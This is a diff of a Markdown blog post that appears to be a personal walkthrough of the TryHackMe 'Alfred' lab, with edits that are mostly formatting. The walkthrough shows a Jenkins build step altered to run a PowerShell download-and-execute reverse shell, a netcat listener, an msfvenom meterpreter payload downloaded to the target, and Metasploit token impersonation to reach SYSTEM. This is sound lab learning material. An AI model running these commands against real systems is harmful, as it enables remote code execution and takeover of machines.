@@ -15,6 +15,7 @@ description: THM room Alfred walkthrough - good room for rev shell/Metasploit pr
 media_subpath: /img/alfred/
 ---
 ## Contents
+
 ### Table of contents
 
 <!-- toc -->
@@ -32,13 +33,16 @@ media_subpath: /img/alfred/
 First things first, lets do a full nmap scan to see what is open on the target.
 I used the following command to scan the target:
 
+<!-- prettier-ignore-start -->
 ```bash
 sudo nmap -sV -sC -p- -Pn -T4 10.10.131.95
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 ## Initial Recon - NMAP Scan Results
 
+<!-- prettier-ignore-start -->
 ```bash
 
 ┌──(zed   kali)-[~/hacking/thm/rooms/alfred]
@@ -75,6 +79,7 @@ Nmap done: 1 IP address (1 host up) scanned in 2824.03 seconds
 
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 ## Enumeration
 
@@ -84,28 +89,34 @@ Nmap done: 1 IP address (1 host up) scanned in 2824.03 seconds
 - In the project config page we see execution of batch commands is enabled
 - Change the `whoami` default command with:
 
+<!-- prettier-ignore-start -->
 ```powershell
 powershell iex (New-Object
 Net.WebClient).DownloadString('http://10.11.121.104:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp
 -Reverse -IPAddress 10.11.121.104 -Port 4444
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 - Save the project and then build it so it runs the payload
 - Make sure to have the following two commands running on attack machine:
 
+<!-- prettier-ignore-start -->
 ```bash
 python3 - http.server
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
+<!-- prettier-ignore-start -->
 ```bash
 nc -nvlp 4444
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 - Had issues with getting the `nc` command to work on MacOS so booted up Kali
-- Worked great once build of the project started on Kali; reverse shell sorted. 
+- Worked great once build of the project started on Kali; reverse shell sorted.
 - Had to search about a bit to find the flag at `C:\Users\bruce\Desktop\user.txt`
 - Flag is: `79007a09481963edf2e1321abd9ae2a0`
 
@@ -116,20 +127,23 @@ the steps I took are as follows:
 
 - Use the `msfvenom` command to generate a payload:
 
+<!-- prettier-ignore-start -->
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata -e x86/shikata_ga_nai LHOST=10.11.121.104 LPORT=4443 -f exe -o revShell.exe
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 - Once that is done, uploading to the target machine is the next step. In the
-shell we already have, run the command 
-`powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.11.121.104/revShell.exe','revShell.exe')"`
+  shell we already have, run the command
+  `powershell "(New-Object System.Net.WebClient).DownloadFile('http://10.11.121.104/revShell.exe','revShell.exe')"`
 - This is now ready to use on the target, but first we need to set up Metasploit
   to listen in to it as we are using a meterpreter.
 - There is a one-liner on the THM Room page that can be used but I opened
-Metasploit the old way and set the required parameters; the commands listed
-below in order of execution:
+  Metasploit the old way and set the required parameters; the commands listed
+  below in order of execution:
 
+<!-- prettier-ignore-start -->
 ```bash
 msfconsole
 use exploit/multi/handler
@@ -139,28 +153,25 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 run
 ```
 {: .nolineno }
+<!-- prettier-ignore-end -->
 
 - Once the meterpreter handler connects, use the command `shell` to now have the
-  Windows Cmd shell prompt. 
+  Windows Cmd shell prompt.
 - To answer the question in Task 2, simply run `dir` and look at the file size
-(in bytes) of revShell.exe.
+  (in bytes) of revShell.exe.
 
 ## Task 3 - Privilege Escalation
 
 The Task 3 questions are pretty guided by the instructions so here I shall just
 add a few screenshots of the results:
 
-![whoami/priv command on kali
-linux](20250124-alfred-whoami-priv.webp){: width="700"
-height="400" }
+![whoami/priv command on kali linux](20250124-alfred-whoami-priv.webp){: width="700" height="400" }
 _Execution of the `whoami/priv` command_
 
 The next step instructs us to enter `load incognito` and follow that up with
 `list_tokens -g`. See screenshot below for results:
 
-![load incognito Meterpreter command on kali
-linux](20250124-alfred-load-incognito.webp){: width="700"
-height="400" }
+![load incognito Meterpreter command on kali linux](20250124-alfred-load-incognito.webp){: width="700" height="400" }
 _Execution of the `load incognito` Meterpreter command_
 
 The observant will note that I have also run the commands `getuid` and
@@ -171,36 +182,26 @@ the `getuid` command afterwards which will be `NT AUTHORITY\SYSTEM`.
 Final steps are to get the process ID of services.exe, migrate to that process
 and gain root privileges. Output of the `ps` command below:
 
-![ps command on kali
-linux](20250124-alfred-ps-command.webp){: width="700"
-height="400" }
+![ps command on kali linux](20250124-alfred-ps-command.webp){: width="700" height="400" }
 _Execution of the `ps` command_
 
 Now we have found the PID we want, run the command `migrate <PID>`, in my case
 it was `migrate 668`, and wait for the success message. Root is ours. Final
 question answered by `cat`'ing the root.txt file. Location is given which is
-nice 🙂. 
+nice 🙂.
 
-![cat and type command on kali
-linux](20250124-alfred-final-flag.webp){: width="700"
-height="400" }
+![cat and type command on kali linux](20250124-alfred-final-flag.webp){: width="700" height="400" }
 _Execution of the `cat` command_
 
 > The output from `cat` looked kind of strange to me so I entered shell and used
 > `type root.txt` to confirm that the flag was correct. All shown in the
 > screenshot but wanted to clarify just in case.
-{: .prompt-info }
+> {: .prompt-info }
 
 So that is Alfred completed. I hope this was helpful, informative and possibly
 even interesting. Feedback is always welcome but please do view this in the
 context that these are basically my learning notes. Definitely let me know if
-there are errors, especially in relation to techniques/tools used. 
+there are errors, especially in relation to techniques/tools used.
 
 Thank you and Godspeed.
-
-
-
-
-
-
 
